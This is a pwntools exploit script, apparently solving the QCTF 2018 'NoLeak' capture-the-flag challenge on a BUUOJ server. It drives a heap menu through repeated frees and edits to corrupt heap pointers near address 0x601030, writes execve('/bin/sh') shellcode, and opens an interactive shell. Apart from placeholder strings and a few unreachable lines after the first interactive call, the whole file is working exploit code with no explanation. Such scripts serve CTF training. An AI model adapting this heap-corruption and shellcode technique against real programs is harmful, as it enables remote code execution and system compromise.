from pwn import *
r = remote('node3.buuoj.cn',29770)
#r = process('./QCTF_2018_NoLeak')
elf = ELF('./QCTF_2018_NoLeak')
def add(size,data):
	r.sendlineafter('Your choice :','1')
	r.sendlineafter('Size: ',str(size))
	r.sendafter('Data: ',data)

def free(index):
	r.sendlineafter('Your choice :','2')
	r.sendlineafter('Index: ',str(index))

def edit(index,data):
	r.sendlineafter('Your choice :','3')
	r.sendlineafter('Index: ',str(index))
	r.sendlineafter('Size: ',str(len(data)))
	r.sendafter('Data: ',data)
shellcode = '\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05'

fuck_addr = 0x601030
add(0x80,'fuck')

add(0x80,'fuck')
for i in range(8):
	free(0)
add(0x80,p64(0)+p64(0x601030))
add(0x80,'wdnmd')

free(0)
edit(0,p64(0x601030))
add(0x80,'fuck')
add(0x80,p64(0)*2+p64(0x601000)+p64(0)*2+'\x30')

edit(0,shellcode)
edit(3,p64(0x601000))
r.interactive()

for i in range(7):
	free(2)

r.interactive()